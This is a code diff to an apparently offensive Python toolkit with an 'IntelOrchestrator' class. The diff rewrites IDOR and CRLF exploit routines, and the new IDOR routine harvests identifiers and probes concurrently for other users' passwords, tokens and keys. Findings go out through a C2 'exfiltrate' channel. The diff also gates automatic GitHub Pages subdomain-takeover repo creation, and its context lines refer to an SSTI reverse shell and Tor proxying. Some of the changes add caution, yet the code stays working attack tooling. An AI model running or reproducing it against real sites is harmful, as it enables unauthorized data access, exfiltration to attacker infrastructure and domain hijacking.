@@ -89,7 +89,7 @@ from collections import defaultdict
 from datetime import datetime, timezone
 from pathlib import Path
 from typing import Dict, List, Optional, Any, Set, Tuple
-from urllib.parse import quote, urlparse, urljoin, parse_qs, urlencode
+from urllib.parse import quote, urlparse, urljoin, parse_qs, urlencode, urlunparse
 
 # ── Toolkit integration ──────────────────────────────────────────────────
 _TOOLKIT_ROOT = Path(__file__).resolve().parent.parent
@@ -104,6 +104,7 @@ from gs_common import (
 import requests
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # ── Optional deps ─────────────────────────────────────────────────────────
 try:
@@ -125,6 +126,7 @@ DEHASHED_EMAIL = os.environ.get("DEHASHED_EMAIL", "")
 GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
 GITHUB_USER = os.environ.get("GITHUB_USER", "")
 HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", "")
+GITHUB_AUTO_CLAIM = os.environ.get("GITHUB_AUTO_CLAIM", "").lower() in ("1", "true", "yes")
 
 # Global proxy port — set at startup from --tor-proxy, used by PoC export
 # to generate curl commands that match the operator's actual Tor port.
@@ -165,6 +167,10 @@ _re_dockerfile = re.compile(
     r"^\s*(?:FROM|RUN|CMD|EXPOSE|ENV|COPY|ADD|WORKDIR|ENTRYPOINT|ARG)\s+",
     re.M | re.I,
 )
+_re_uuid = re.compile(
+    r"\b[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[1-8][0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12}\b",
+)
+_re_ulid = re.compile(r"\b[0-7][0-9A-HJKMNP-TV-Z]{25}\b")
 
 # ══════════════════════════════════════════════════════════════════════════
 #  Browser Profile Rotation
@@ -8834,9 +8840,11 @@ class IntelOrchestrator:
                     "service": "GitHub Pages",
                     "instructions": f"Create repo {subdomain.replace('.', '-')} and enable GitHub Pages"
                 })
-                # Auto-create GitHub repo if API key available
-                if GITHUB_TOKEN:
+                # Disabled by default: opt-in to avoid accidental repo actions.
+                if GITHUB_TOKEN and GITHUB_AUTO_CLAIM:
                     self._create_github_repo(subdomain)
+                elif GITHUB_TOKEN:
+                    print("  [*] GitHub auto-claim disabled (set GITHUB_AUTO_CLAIM=true to enable).")
 
             elif "herokuapp.com" in cname:
                 print(f"  [!] Heroku takeover possible for {subdomain}")
@@ -8957,74 +8965,278 @@ class IntelOrchestrator:
             print(f"  [+] Reverse shell attempted via SSTI")
 
     def _exploit_idor(self, base_url: str, param: str):
-        """Auto-exploit IDOR to access other users' data."""
-        # Enumerate user IDs
-        for user_id in range(1, 11):
-            test_url = f"{base_url.split('?')[0]}?{param}={user_id}"
-            resp = self._session.get(test_url)
-            if resp and resp.status_code == 200 and "password" in resp.text.lower():
-                print(f"  [+] IDOR exploited - user {user_id} data leaked")
-                self._c2.exfiltrate({
-                    "type": "idor_exploited",
-                    "target": base_url,
-                    "user_id": user_id,
-                    "data": resp.text[:1000]
-                })
-                break
-
-    def _exploit_crlf(self, base_url: str, param: str):
-        """Auto-exploit CRLF to inject headers or XSS."""
-        # Header injection
-        crlf_payload = "%0d%0aX-Forwarded-For:%20127.0.0.1"
-        test_url = f"{base_url.split('?')[0]}?{param}={crlf_payload}"
-        resp = self._session.get(test_url)
-        if resp and "127.0.0.1" in resp.headers.get("X-Forwarded-For", ""):
-            print(f"  [+] CRLF header injection successful")
+        """Assess IDOR using discovered identifiers (UUID/ULID/slugs)."""
+        candidates = self._collect_idor_candidates(base_url, param)
+        if not candidates:
+            print("  [*] IDOR check skipped: no suitable identifier candidates discovered.")
             self._c2.exfiltrate({
-                "type": "crlf_injection",
+                "type": "idor_assessment",
                 "target": base_url,
-                "payload": crlf_payload,
-                "injected_header": "X-Forwarded-For: 127.0.0.1"
+                "parameter": param,
+                "result": "no_candidate_identifiers",
+            })
+            return
+
+        # Baseline with a synthetic identifier to reduce false positives from
+        # generic profile pages that always return a similar response.
+        baseline_id = f"{secrets.token_hex(4)}-{secrets.token_hex(4)}"
+        baseline_resp = self._session.get(self._build_param_url(base_url, param, baseline_id))
+        baseline_fp = self._response_fingerprint(baseline_resp)
+
+        findings = []
+
+        def _probe(identifier: str) -> Optional[dict]:
+            url = self._build_param_url(base_url, param, identifier)
+            resp = self._session.get(url)
+            if not resp:
+                return None
+            if resp.status_code not in (200, 206):
+                return None
+            if baseline_fp and baseline_fp == self._response_fingerprint(resp):
+                return None
+            body = resp.text or ""
+            score, signals = self._score_sensitive_response(body)
+            if score < 2:
+                return None
+            return {
+                "identifier": identifier,
+                "url": url,
+                "status_code": resp.status_code,
+                "signals": signals,
+                "response_preview": body[:500],
+            }
+
+        max_workers = min(8, max(2, len(candidates)))
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            futures = {executor.submit(_probe, cid): cid for cid in candidates}
+            for fut in as_completed(futures):
+                try:
+                    row = fut.result()
+                except Exception as e:
+                    integrity_log("intel", f"idor_probe_error:{type(e).__name__}")
+                    continue
+                if not row:
+                    continue
+                findings.append(row)
+                if len(findings) >= 3:
+                    break
+
+        if findings:
+            print(f"  [!] IDOR risk: {len(findings)} candidate identifier(s) returned sensitive data patterns")
+            self._c2.exfiltrate({
+                "type": "idor_unauthorized_access",
+                "target": base_url,
+                "parameter": param,
+                "candidate_count": len(findings),
+                "candidates": findings,
+            })
+        else:
+            print("  [+] IDOR check: no unauthorized data pattern confirmed with discovered identifiers")
+            self._c2.exfiltrate({
+                "type": "idor_assessment",
+                "target": base_url,
+                "parameter": param,
+                "result": "no_sensitive_data_disclosure",
+                "tested_candidates": len(candidates),
             })
 
-        # XSS via CRLF
-        xss_payload = "%0d%0a%0d%0a<script>alert(document.domain)</script>"
-        test_url = f"{base_url.split('?')[0]}?{param}={xss_payload}"
-        resp = self._session.get(test_url)
-        if resp and "<script>alert(document.domain)</script>" in resp.text:
-            print(f"  [+] CRLF XSS injection successful")
+    def _exploit_crlf(self, base_url: str, param: str):
+        """Assess CRLF handling; flag only legacy/misconfigured behavior."""
+        canary = "x-intel-crlf-canary"
+        payloads = [
+            ("\r\nX-Intel-CRLF-Canary:1", "header-break"),
+            (f"\r\n\r\n<{canary}>", "body-break"),
+        ]
+
+        blocked = 0
+        suspicious = []
+
+        for payload, kind in payloads:
+            test_url = self._build_param_url(base_url, param, payload)
+            resp = self._session.get(test_url)
+            if not resp:
+                continue
+            headers_blob = "\n".join(f"{k}:{v}" for k, v in resp.headers.items()).lower()
+            body = (resp.text or "").lower()
+            if canary in headers_blob or f"<{canary}>" in body:
+                suspicious.append({"kind": kind, "status": resp.status_code, "url": test_url})
+                continue
+            if resp.status_code in (400, 403, 404, 414, 431):
+                blocked += 1
+
+        if suspicious:
+            print("  [!] CRLF handling appears abnormal (possible legacy intermediary).")
             self._c2.exfiltrate({
-                "type": "crlf_xss",
+                "type": "crlf_possible_legacy_path",
                 "target": base_url,
-                "payload": xss_payload
+                "parameter": param,
+                "hits": suspicious,
+            })
+        else:
+            print("  [+] CRLF payloads filtered or normalized by upstream stack.")
+            self._c2.exfiltrate({
+                "type": "crlf_assessment",
+                "target": base_url,
+                "parameter": param,
+                "result": "filtered_or_normalized",
+                "blocked_responses": blocked,
             })
 
     def _create_github_repo(self, subdomain: str):
-        """Auto-create GitHub repo for subdomain takeover."""
-        repo_name = subdomain.replace(".", "-")
+        """Optionally create GitHub repo for dangling GitHub Pages claim."""
+        if not GITHUB_AUTO_CLAIM:
+            print("  [*] Skipping GitHub auto-claim (GITHUB_AUTO_CLAIM is disabled).")
+            return
+        if not GITHUB_TOKEN or not GITHUB_USER:
+            print("  [*] Skipping GitHub auto-claim (missing GITHUB_TOKEN or GITHUB_USER).")
+            return
+
+        repo_name = re.sub(r"[^a-z0-9-]", "-", subdomain.lower()).strip("-")[:100]
+        if not repo_name:
+            print(f"  [*] GitHub auto-claim skipped: invalid repo name derived from {subdomain}")
+            return
         headers = {
             "Authorization": f"token {GITHUB_TOKEN}",
-            "Accept": "application/vnd.github.v3+json"
+            "Accept": "application/vnd.github.v3+json",
         }
-        data = {
-            "name": repo_name,
-            "auto_init": True,
-            "private": False
+        timeout = 15
+
+        # Check if the repo already exists first.
+        repo_url = f"https://api.github.com/repos/{GITHUB_USER}/{repo_name}"
+        repo_check = requests.get(repo_url, headers=headers, timeout=timeout)
+        if repo_check.status_code == 404:
+            data = {"name": repo_name, "auto_init": True, "private": False}
+            resp = requests.post("https://api.github.com/user/repos", headers=headers, json=data, timeout=timeout)
+            if resp.status_code != 201:
+                print(f"  [*] GitHub repo create failed for {repo_name} (status {resp.status_code})")
+                self._c2.exfiltrate({
+                    "type": "github_claim_attempt",
+                    "subdomain": subdomain,
+                    "repo": repo_name,
+                    "result": "create_failed",
+                    "status_code": resp.status_code,
+                })
+                return
+            print(f"  [+] GitHub repo {repo_name} created")
+        elif repo_check.status_code != 200:
+            print(f"  [*] GitHub repo check failed for {repo_name} (status {repo_check.status_code})")
+            return
+        else:
+            print(f"  [*] GitHub repo {repo_name} already exists")
+
+        pages_data = {"source": {"branch": "main", "path": "/"}}
+        pages_resp = requests.post(
+            f"https://api.github.com/repos/{GITHUB_USER}/{repo_name}/pages",
+            headers=headers,
+            json=pages_data,
+            timeout=timeout,
+        )
+        if pages_resp.status_code in (201, 204):
+            print(f"  [+] GitHub Pages enabled for {repo_name}")
+            self._c2.exfiltrate({
+                "type": "github_claim_attempt",
+                "subdomain": subdomain,
+                "repo": repo_name,
+                "result": "pages_enabled",
+            })
+        elif pages_resp.status_code == 409:
+            print(f"  [*] GitHub Pages already configured for {repo_name}")
+        else:
+            print(f"  [*] GitHub Pages enable failed for {repo_name} (status {pages_resp.status_code})")
+
+    def _build_param_url(self, base_url: str, param: str, value: str) -> str:
+        """Return URL with param replaced/added while preserving other query keys."""
+        parsed = urlparse(base_url)
+        path = parsed.path or "/"
+        params = parse_qs(parsed.query, keep_blank_values=True)
+        params[param] = [str(value)]
+        query = urlencode(params, doseq=True)
+        return urlunparse((parsed.scheme, parsed.netloc, path, parsed.params, query, parsed.fragment))
+
+    @staticmethod
+    def _response_fingerprint(resp) -> str:
+        """Compact response fingerprint for lightweight baseline matching."""
+        if not resp:
+            return ""
+        body = resp.text or ""
+        sample = body[:512].encode("utf-8", errors="ignore")
+        digest = hashlib.sha256(sample).hexdigest()[:16]
+        return f"{resp.status_code}:{len(body)}:{digest}"
+
+    @staticmethod
+    def _score_sensitive_response(text: str) -> Tuple[int, List[str]]:
+        """Return a heuristic score and matching sensitive-data signals."""
+        lowered = (text or "").lower()
+        signals = []
+        checks = {
+            "password_field": r'"password"\s*:',
+            "passwd_token": r"\bpasswd\b",
+            "api_key": r"\bapi[_-]?key\b",
+            "access_token": r"\baccess[_-]?token\b",
+            "private_key": r"-----begin (?:rsa |ec )?private key-----",
+            "session_token": r"\bsession[_-]?token\b",
+            "ssn": r"\bssn\b",
+            "credit_card": r"\b(?:\d[ -]*?){13,16}\b",
+            "auth_header": r"\bauthorization:\s*bearer\b",
         }
-        resp = requests.post("https://api.github.com/user/repos", headers=headers, json=data)
-        if resp.status_code == 201:
-            print(f"  [+] GitHub repo {repo_name} created for takeover")
-            # Enable GitHub Pages
-            pages_data = {
-                "source": {
-                    "branch": "main",
-                    "path": "/"
-                }
-            }
-            resp = requests.post(f"https://api.github.com/repos/{GITHUB_USER}/{repo_name}/pages",
-                                headers=headers, json=pages_data)
-            if resp.status_code == 201:
-                print(f"  [+] GitHub Pages enabled for {repo_name}")
+        high_conf = {"password_field", "private_key", "access_token", "auth_header"}
+        score = 0
+        for name, pattern in checks.items():
+            if re.search(pattern, lowered, re.I):
+                signals.append(name)
+                score += 2 if name in high_conf else 1
+        return score, signals
+
+    def _collect_idor_candidates(self, base_url: str, param: str) -> List[str]:
+        """Gather non-sequential IDs from visible app artifacts for IDOR checks."""
+        candidates: List[str] = []
+        seen: Set[str] = set()
+
+        def _add(val: str):
+            v = (val or "").strip()
+            if not v or v in seen:
+                return
+            if v.isdigit():
+                return
+            if len(v) < 8 or len(v) > 128:
+                return
+            seen.add(v)
+            candidates.append(v)
+
+        parsed = urlparse(base_url)
+        qvals = parse_qs(parsed.query, keep_blank_values=True).get(param, [])
+        for v in qvals:
+            _add(v)
+
+        recent_results = self._results[-8:]
+        for result in recent_results:
+            for txt in (
+                result.get("url", ""),
+                result.get("raw_html", "")[:250000],
+            ):
+                if not txt:
+                    continue
+                for m in _re_uuid.findall(txt):
+                    _add(m)
+                for m in _re_ulid.findall(txt):
+                    _add(m)
+                for m in re.findall(
+                    rf"(?:[?&]{re.escape(param)}=|\"{re.escape(param)}\"\s*:\s*\")([A-Za-z0-9_-]{{8,128}})",
+                    txt,
+                    flags=re.I,
+                ):
+                    _add(m)
+
+        for finding in self._vuln_findings[-20:]:
+            for txt in (finding.get("detail", ""), finding.get("evidence", ""), finding.get("test_url", "")):
+                if not txt:
+                    continue
+                for m in _re_uuid.findall(txt):
+                    _add(m)
+                for m in _re_ulid.findall(txt):
+                    _add(m)
+
+        return candidates[:120]
 
     def _create_heroku_app(self, subdomain: str):
         """Auto-create Heroku app for subdomain takeover."""
